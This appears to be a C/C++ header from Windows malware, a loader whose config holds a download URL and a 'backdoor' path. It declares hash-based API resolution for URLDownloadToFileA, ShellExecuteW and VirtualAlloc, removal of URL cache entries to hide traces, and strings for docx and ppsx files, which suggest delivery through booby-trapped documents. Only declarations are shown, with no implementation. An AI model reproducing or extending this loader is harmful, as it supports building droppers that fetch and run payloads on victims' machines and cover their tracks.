#include <Windows.h>
#ifndef __loader_h
#define __loader_h

//#pragma optimize("", off)
#include "winapi.h"

#define FAST_KERNEL32_HANDLE
#define FAST_POINTERS

struct __config {
	STARTUPINFOA startup;
	PROCESS_INFORMATION process;
	char szUrl[132];
	char szBackdoorPath[52];
};
struct __strings
{
//	DWORD ShellcodeGadget1;
//	DWORD ShellcodeGadget2;
//	DWORD ShellcodeGadget3;
	CHAR strNtDll[6];
	CHAR strKernel32[9];
	CHAR strUser32[7];
	CHAR strShell32[8];
	CHAR strUrlMon[7];
	CHAR strWinInet[8];
	
	CHAR strVirtualAlloc[13];
	CHAR strGetFileSize[12];
	CHAR strSleep[6];
	CHAR strExitProcess[12];
	CHAR strGetModuleFileNameW[19];
	CHAR strZwQueryInformationFile[23];
	CHAR strShellExecuteW[14];
	CHAR strUrlDownloadToFileA[19];
	CHAR strSHGetSpecialFolderPathA[24];
	CHAR strFindFirstUrlCacheEntryA[24];
	CHAR strFindNextUrlCacheEntryA[23];
	CHAR strDeleteUrlCacheEntryA[21];
	CHAR strFindCloseUrlCache[18];
	CHAR strNtQueryObject[14];
	CHAR strCloseHandle[12];
	CHAR strGetShortPathNameA[18];

	CHAR strSWFSuffix[5];

	WCHAR strPPRunning1[5];
	WCHAR strPPRunning2[8];

	WCHAR strDocx[6];
	WCHAR strDOCX[6];
	WCHAR strPpsx[6];
	WCHAR strPPSX[6];
	WCHAR strDOCArgs[8];
	WCHAR strPPTArgs[5];
	WCHAR strTmp[4];
	WCHAR strQuote[2];

};
typedef struct _VTABLE
{
	GETPROCADDRESS GetProcAddress;
	LOADLIBRARYA LoadLibraryA;
	OUTPUTDEBUGSTRINGA OutputDebugStringA;
	GETFILESIZE GetFileSize;
	VIRTUALALLOC VirtualAlloc;
	CLOSEHANDLE CloseHandle;
	SLEEP Sleep;
	EXITPROCESS ExitProcess;
	SHELLEXECUTEW ShellExecuteW;
	GETSHORTPATHNAMEW GetShortPathNameW;
	GETMODULEFILENAMEW GetModuleFileNameW;
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTQUERYOBJECT NtQueryObject;
	FINDFIRSTURLCACHEENTRYA FindFirstUrlCacheEntryA;
	FINDNEXTURLCACHEENTRYA FindNextUrlCacheEntryA;
	DELETEURLCACHEENTRYA DeleteUrlCacheEntryA;
	FINDCLOSEURLCACHE FindCloseUrlCache;
	URLDOWNLOADTOFILEA URLDownloadToFileA;
	SHGETSPECIALFOLDERPATHA SHGetSpecialFolderPathA;
	GETSHORTPATHNAMEA GetShortPathNameA;
} VTABLE, *PVTABLE;

extern "C" VOID Startup();
extern "C" VOID LoaderEntryPoint(struct __vtbl *VTBL, struct __config *config, struct __strings *strings);
extern "C" BOOL GetVTable(__out PVTABLE lpTable, struct __strings *strings);
extern "C" BOOL GetPointers(__out PGETPROCADDRESS fpGetProcAddress, __out PLOADLIBRARYA fpLoadLibraryA);
extern "C" HANDLE GetKernel32Handle();
extern "C" VOID RemoveCachedObject(PVTABLE lpTable, LPSTR strUrl, BOOL isSubString);
#ifdef FAST_POINTERS
extern "C" DWORD GetStringHash(__in LPVOID lpBuffer, __in BOOL bUnicode, __in UINT uLen);
#endif
// crt
extern "C" BOOL __ISUPPER__(__in CHAR c);
extern "C" CHAR __TOLOWER__(__in CHAR c);
extern "C" UINT __STRLEN__(__in LPSTR lpStr1);
extern "C" UINT __STRLENW__(__in LPWSTR lpStr1);
extern "C" INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
extern "C" LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
extern "C" INT __STRNCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2, __in DWORD dwLen);
extern "C" INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2,__in DWORD dwLen);
extern "C" LPWSTR __STRCATW__(__in LPWSTR	strDest, __in LPWSTR strSource);
extern "C" LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);
extern "C" VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize);
extern "C" LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
extern "C" LPSTR __STRCAT__(__in LPSTR	strDest, __in LPSTR strSource);
extern "C" VOID END_LOADER_DATA();

// OPTIONS -> linker -> function order

//#pragma optimize("", on)
#endif //__loader_h